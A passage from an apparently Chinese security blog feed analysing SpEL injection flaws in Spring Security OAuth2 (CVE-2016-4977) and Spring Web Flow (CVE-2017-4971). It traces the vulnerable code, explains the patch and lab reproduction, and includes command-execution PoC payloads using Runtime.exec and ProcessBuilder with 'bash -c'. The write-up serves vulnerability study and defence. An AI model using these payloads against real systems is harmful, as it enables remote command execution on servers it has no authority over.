class="meta">@FrameworkEndpoint</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WhitelabelErrorEndpoint</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ERROR = <span class="string">"&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/oauth/error"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">handleError</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">Map&lt;String, Object&gt; model = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">Object error = request.getAttribute(<span class="string">"error"</span>);</span><br><span class="line"><span class="comment">// The error summary may contain malicious user input,</span></span><br><span class="line"><span class="comment">// it needs to be escaped to prevent XSS</span></span><br><span class="line">String errorSummary;</span><br><span class="line"><span class="keyword">if</span> (error <span class="keyword">instanceof</span> OAuth2Exception) &#123;</span><br><span class="line">OAuth2Exception oauthError = (OAuth2Exception) error;</span><br><span class="line">errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">errorSummary = <span class="string">"Unknown error"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.put(<span class="string">"errorSummary"</span>, errorSummary);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> SpelView(ERROR), model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里errorSummary变量的值就是获取的我们输入的恶意参数的值即恶意SpEL表达式，此时errorSummary变量值为前面生成的PoC的内容即<code>${T(java.lang.Runtime).getRuntime().exec(...)}</code>。</p><p>接着我们看下SpelView类的源码，路径为：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Simple String template renderer.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpelView</span> <span class="keyword">implements</span> <span class="title">View</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">SpelView</span><span class="params">(String template)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.template = template;</span><br><span class="line"><span class="keyword">this</span>.context.addPropertyAccessor(<span class="keyword">new</span> MapAccessor());</span><br><span class="line"><span class="keyword">this</span>.helper = <span class="keyword">new</span> PropertyPlaceholderHelper(<span class="string">"$&#123;"</span>, <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">this</span>.resolver = <span class="keyword">new</span> PlaceholderResolver() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resolvePlaceholder</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">Expression expression = parser.parseExpression(name);</span><br><span class="line">Object value = expression.getValue(context);</span><br><span class="line"><span class="keyword">return</span> value == <span class="keyword">null</span> ? <span class="keyword">null</span> : value.toString();</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">render</span><span class="params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">...</span><br><span class="line">String result = helper.replacePlaceholders(template, resolver);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到以下两个函数：</p><ul><li>在SpelView类的构造函数中，传参是赋值给了template属性即模板，helper属性是PropertyPlaceholderHelper类型、其中的两个传参分别是包括表达式字符串的前缀和后缀字符串，resolver属性是规定了如何解析这个错误信息、这里看到是定义了resolvePlaceholder()函数，该函数是将传参定义为Expression类型的表达式，再调用<code>expression.getValue(context)</code>，这就是SpEL表达式解析的地方，也是漏洞最后执行的地方。</li><li>在render()函数中，负责渲染页面，这里会调用replacePlaceholders()函数来使用resolver属性作为解析器、template属性作为模板进行页面的解析渲染。</li></ul><p>在前面的ModelAndView类的构造函数中使用SpelView类来渲染页面，必然会调用到render()函数，而该函数调用了replacePlaceholders()函数。我们跟进该函数看看，路径为：<a href="https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-framework/blob/v4.1.4.RELEASE/spring-core/src/main/java/org/springframework/util/PropertyPlaceholderHelper.java</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replaces all placeholders of format &#123;<span class="doctag">@code</span> $&#123;name&#125;&#125; with the value returned</span></span><br><span class="line"><span class="comment"> * from the supplied &#123;<span class="doctag">@link</span> PlaceholderResolver&#125;.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value the value containing the placeholders to be replaced</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> placeholderResolver the &#123;<span class="doctag">@code</span> PlaceholderResolver&#125; to use for replacement</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the supplied value with placeholders replaced inline</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">replacePlaceholders</span><span class="params">(String value, PlaceholderResolver placeholderResolver)</span> </span>&#123;</span><br><span class="line">Assert.notNull(value, <span class="string">"'value' must not be null"</span>);</span><br><span class="line"><span class="keyword">return</span> parseStringValue(value, placeholderResolver, <span class="keyword">new</span> HashSet&lt;String&gt;());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> String <span class="title">parseStringValue</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">String strVal, PlaceholderResolver placeholderResolver, Set&lt;String&gt; visitedPlaceholders)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Recursive invocation, parsing placeholders contained in the placeholder key.</span></span><br><span class="line">placeholder = parseStringValue(placeholder, placeholderResolver, visitedPlaceholders);</span><br><span class="line"><span class="comment">// Now obtain the value for the fully resolved key...</span></span><br><span class="line">String propVal = placeholderResolver.resolvePlaceholder(placeholder);</span><br><span class="line">               ...</span><br></pre></td></tr></table></figure><p>看到replacePlaceholders()函数中是直接调用了parseStringValue()函数来进一步解析；在parseStringValue()函数中，递归调用了自身以获取前面SpelView类实例helper属性的前缀和后缀字符串括起来的内容并赋值给placeholder变量，接着就调用了SpelView类实例resolver属性的resolvePlaceholder()函数来解析这个placeholder变量值即我们输入的恶意SpEL表达式，从而在resolvePlaceholder()函数中调用了<code>expression.getValue(context)</code>导致SpEL表达式注入漏洞的触发。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>看下2.0.10版本的补丁怎么打的：<a href="https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d#diff-1490000798a5128b354afb04c352773a</a></p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/3.png" alt=""></p><blockquote><p>可以看到在<strong>第一次执行表达式之前</strong>程序将<code>$</code>替换成了由<code>RandomValueStringGenerator().generate()</code>生成的随机字符串，也就是<code>${errorSummary} -&gt; random{errorSummary}</code>，但是这个替换不是递归的，所以<code>${2334-1}</code>并没有变。</p><p>然后创建了一个<code>helper</code>使程序取<code>random{}</code>中的内容作为表达式，这样就使得<code>errorSummary</code>被作为表达式执行了，而<code>${2334-1}</code>因为不符合<code>random{}</code>这个形式所以没有被当作表达式，从而也就没有办法被执行了。</p><p>不过这个Patch有一个缺点：<code>RandomValueStringGenerator</code>生成的字符串虽然内容随机，但长度固定为6，所以存在暴力破解的可能性。</p></blockquote><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.knownsec.com/2016/10/spring-security-oauth-rce/" target="_blank" rel="noopener">Spring Security OAuth RCE (CVE-2016-4977) 漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
      <category term="SpEL注入" scheme="https://www.mi1k7ea.com/tags/SpEL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Web Flow之CVE-2017-4971</title>
    <link href="https://www.mi1k7ea.com/2020/02/09/%E6%B5%85%E6%9E%90Spring-WebFlow%E4%B9%8BCVE-2017-4971/"/>
    <id>https://www.mi1k7ea.com/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/</id>
    <published>2020-02-09T04:12:36.000Z</published>
    <updated>2020-02-09T14:12:35.753Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Web-Flow"><a href="#0x01-Spring-Web-Flow" class="headerlink" title="0x01 Spring Web Flow"></a>0x01 Spring Web Flow</h2><p>Spring Web Flow是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来，其最主要的目的是解决跨越多个请求的、用户与服务器之间的、有状态交互问题。</p><p>具体更多的简介可参考IBM的文章：<a href="https://www.ibm.com/developerworks/cn/education/java/j-spring-webflow/index.html" target="_blank" rel="noopener">Spring Web Flow 2.0 入门</a></p><h2 id="0x02-CVE-2017-4971"><a href="#0x02-CVE-2017-4971" class="headerlink" title="0x02 CVE-2017-4971"></a>0x02 CVE-2017-4971</h2><p>在Spring Web Flow 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>Spring Web Flow 2.4.0 ~ 2.4.4</li><li>一些老的不再支持的版本也受影响</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulapps的环境（Vulhub的环境在下载时老不成功）：</p><p><a href="http://vulapps.evalbug.com/s_springwebflow_1/" target="_blank" rel="noopener">http://vulapps.evalbug.com/s_springwebflow_1/</a></p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ul><li>在Web Flow配置文件中view-state节点中指定了model属性，并且没有指定绑定的参数，即view-state中没有配置binder节点；</li><li>MvcViewFactoryCreator类中useSpringBeanBinding默认值（false）未修改；</li></ul><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>先访问/login的接口登录进去，然后随便选择一家酒店点击Book来预订，最后点击Confirm确认，同时用Burp拦截这个Confirm报文，在POST的请求内容中添加如下PoC参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;_T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)</span><br><span class="line">或</span><br><span class="line">&amp;_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;touch /tmp/mi1k7ea&quot;)).start()</span><br></pre></td></tr></table></figure><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/1.png" alt=""></p><p>此时后台就能看到SpEL表达式注入漏洞被成功触发了：</p><p><img src="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/2.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，只从补丁处开始做简单的漏洞点分析。</p><p>代码路径：<a href="https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-webflow/blob/v2.4.4.RELEASE/spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java</a></p><p>漏洞点位于AbstractMvcView类的addEmptyValueMapping()函数，这里ExpressionParser.parseExpression()函数是用于执行传入的第一个参数field的SpEL表达式，即关键在于addEmptyValueMapping()函数第二个参数field是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Adds a special &#123;<span class="doctag">@link</span> DefaultMapping&#125; that results in setting the target field on the model to an empty value</span></span><br><span class="line"><span class="comment"> * (typically null).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mapper the mapper to add the mapping to</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field the field for which a mapping is to be added</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> model the model</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addEmptyValueMapping</span><span class="params">(DefaultMapper mapper, String field, Object model)</span> </span>&#123;</span><br><span class="line">ParserContext parserContext = <span class="keyword">new</span> FluentParserContext().evaluate(model.getClass());</span><br><span class="line">Expression target = expressionParser.parseExpression(field, parserContext);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; propertyType = target.getValueType(model);</span><br><span class="line">Expression source = <span class="keyword">new</span> StaticExpression(getEmptyValue(propertyType));</span><br><span class="line">DefaultMapping mapping = <span class="keyword">new</span> DefaultMapping(source, target);</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Adding empty value mapping for parameter '"</span> + field + <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">mapper.addMapping(mapping);</span><br><span class="line">&#125; <span class="keyword">catch</span> (EvaluationException e) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用addEmptyValueMapping()的函数有两个，都在AbstractMvcView类中，分别为addModelBindings()和addDefaultMappings()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addDefaultMappings</span><span class="params">(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (String parameterName : parameterNames) &#123;</span><br><span class="line"><span class="keyword">if</span> (fieldMarkerPrefix != <span class="keyword">null</span> &amp;&amp; parameterName.startsWith(fieldMarkerPrefix)) &#123;</span><br><span class="line">String field = parameterName.substring(fieldMarkerPrefix.length());</span><br><span class="line"><span class="keyword">if</span> (!parameterNames.contains(field)) &#123;</span><br><span class="line">addEmptyValueMapping(mapper, field, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMapping(mapper, parameterName, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addModelBindings</span><span class="params">(DefaultMapper mapper, Set&lt;String&gt; parameterNames, Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (Binding binding : binderConfiguration.getBindings()) &#123;</span><br><span class="line">String parameterName = binding.getProperty();</span><br><span class="line"><span class="keyword">if</span> (parameterNames.contains(parameterName)) &#123;</span><br><span class="line">addMapping(mapper, binding, model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (fieldMarkerPrefix != <span class="keyword">null</span> &amp;&amp; parameterNames.contains(fieldMarkerPrefix + parameterName)) &#123;</span><br><span class="line">addEmptyValueMapping(mapper, parameterName, model);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这两个函数都调用了存在缺陷的函数，那么我们看看哪个函数才能实际控制field参数。</p><blockquote><p>这里比较明显的区别就是 addModelBindings 函数中 <code>for (Binding binding : binderConfiguration.getBindings())</code> 存在这样一个循环，而且就是这个循环的控制决定了 field 参数的值，经过进一步分析，这里控制 field 的参数的决定性因素就是 binderConfiguration 这个变量所控制的值，这里经过源码的跟踪我们可以发现，binderConfiguration 函数的值就是 webflow-*.xml 中 view-state 中 binder 节点的配置，所以这个函数的值来源于配置文件，所以这个函数我们无法控制，从而无法触发漏洞，所以我们重点来看看 addDefaultMappings 这个函数，我们发现 addDefaultMappings 中我们可以控制 field 参数，所以我们重点来看看如何去触发这个函数。</p></blockquote><p>而同文件中的bind()函数是根据binderConfiguration值是否为null来区分调用这两个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> MappingResults <span class="title">bind</span><span class="params">(Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Binding to model"</span>);</span><br><span class="line">&#125;</span><br><span class="line">DefaultMapper mapper = <span class="keyword">new</span> DefaultMapper();</span><br><span class="line">ParameterMap requestParameters = requestContext.getRequestParameters();</span><br><span class="line"><span class="keyword">if</span> (binderConfiguration != <span class="keyword">null</span>) &#123;</span><br><span class="line">addModelBindings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMappings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mapper.map(requestParameters, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看到当binderConfiguration值为null时才会调用漏洞函数addDefaultMappings()，这也是前提条件之一，在接下来会将原因。</p><p>最终，我们可以得到如下几个关键函数调用链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind()-&gt;addDefaultMappings()-&gt;addEmptyValueMapping()-&gt;parseExpression()</span><br></pre></td></tr></table></figure><h4 id="必须view-state中未配置binder节点的原因"><a href="#必须view-state中未配置binder节点的原因" class="headerlink" title="必须view-state中未配置binder节点的原因"></a>必须view-state中未配置binder节点的原因</h4><p>我们看到bind()函数的源码，在spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView类中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Causes the model to be populated from information contained in request parameters.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If a view has binding configuration then only model fields specified in the binding configuration will be</span></span><br><span class="line"><span class="comment"> * considered. In the absence of binding configuration all request parameters will be used to update matching fields</span></span><br><span class="line"><span class="comment"> * on the model.</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> model the model to be updated</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> an instance of MappingResults with information about the results of the binding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> MappingResults <span class="title">bind</span><span class="params">(Object model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">"Binding to model"</span>);</span><br><span class="line">&#125;</span><br><span class="line">DefaultMapper mapper = <span class="keyword">new</span> DefaultMapper();</span><br><span class="line">ParameterMap requestParameters = requestContext.getRequestParameters();</span><br><span class="line"><span class="keyword">if</span> (binderConfiguration != <span class="keyword">null</span>) &#123;</span><br><span class="line">addModelBindings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">addDefaultMappings(mapper, requestParameters.asMap().keySet(), model);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> mapper.map(requestParameters, model);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有个if判断语句，条件是判断binderConfiguration是否为null。这里只有binderConfiguration为null时，才会进入后面调用存在漏洞的addDefaultMappings()函数的代码逻辑。而binderConfiguration的值是由配置文件中是否有binder节点来控制的。</p><p>看到spring-webflow/src/main/java/org/springframework/webflow/engine/model/builder/xml/XmlFlowModelBuilder类中相关的函数定义，其中parseState()函数用于解析节点，当判断到view-state节点后就调用parseViewState()函数作进一步解析处理，其中调用parseBinder()函数来获取binder字节的内容并设置到binder中，当不存在binder节点时直接返回null：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> AbstractStateModel <span class="title">parseState</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (DomUtils.nodeNameEquals(element, <span class="string">"view-state"</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> parseViewState(element);</span><br><span class="line">&#125;</span><br><span class="line">       ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> ViewStateModel <span class="title">parseViewState</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">ViewStateModel state = <span class="keyword">new</span> ViewStateModel(element.getAttribute(<span class="string">"id"</span>));</span><br><span class="line">...</span><br><span class="line">state.setBinder(parseBinder(element));</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> BinderModel <span class="title">parseBinder</span><span class="params">(Element element)</span> </span>&#123;</span><br><span class="line">Element binderElement = DomUtils.getChildElementByTagName(element, <span class="string">"binder"</span>);</span><br><span class="line"><span class="keyword">if</span> (binderElement != <span class="keyword">null</span>) &#123;</span><br><span class="line">BinderModel binder = <span class="keyword">new</span> BinderModel();</span><br><span class="line">binder.setBindings(parseBindings(binderElement));</span><br><span class="line"><span class="keyword">return</span> binder;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码中没找到binder节点后就会返回null，之后binderConfiguration的值就被设置为了null。</p><h4 id="必须useSpringBeanBinding默认值（false）未修改的原因"><a href="#必须useSpringBeanBinding默认值（false）未修改的原因" class="headerlink" title="必须useSpringBeanBinding默认值（false）未修改的原因"></a>必须useSpringBeanBinding默认值（false）未修改的原因</h4><p>为啥前提条件要useSpringBeanBinding为默认值false即未修改过？</p><p>查看spring-webflow/src/main/java/org/springframework/webflow/mvc/builder/MvcViewFactoryCreator类的createViewFactory()函数，看到如果useSpringBeanBinding这个属性为false则使用默认的解析类，如果这个值为true则使用BeanWrapperExpressionParser类来解析，而该类是无法执行SpEL表达式的（具体可看补丁分析）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ViewFactory <span class="title">createViewFactory</span><span class="params">(Expression viewId, ExpressionParser expressionParser,</span></span></span><br><span class="line"><span class="function"><span class="params">ConversionService conversionService, BinderConfiguration binderConfiguration,</span></span></span><br><span class="line"><span class="function"><span class="params">Validator validator, ValidationHintResolver validationHintResolver)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (useSpringBeanBinding) &#123;</span><br><span class="line">expressionParser = <span class="keyword">new</span> BeanWrapperExpressionParser(conversionService);</span><br><span class="line">&#125;</span><br><span class="line">AbstractMvcViewFactory viewFactory = createMvcViewFactory(viewId, expressionParser, conversionService,</span><br><span class="line">binderConfiguration);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(eventIdParameterName)) &#123;</span><br><span class="line">viewFactory.setEventIdParameterName(eventIdParameterName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(fieldMarkerPrefix)) &#123;</span><br><span 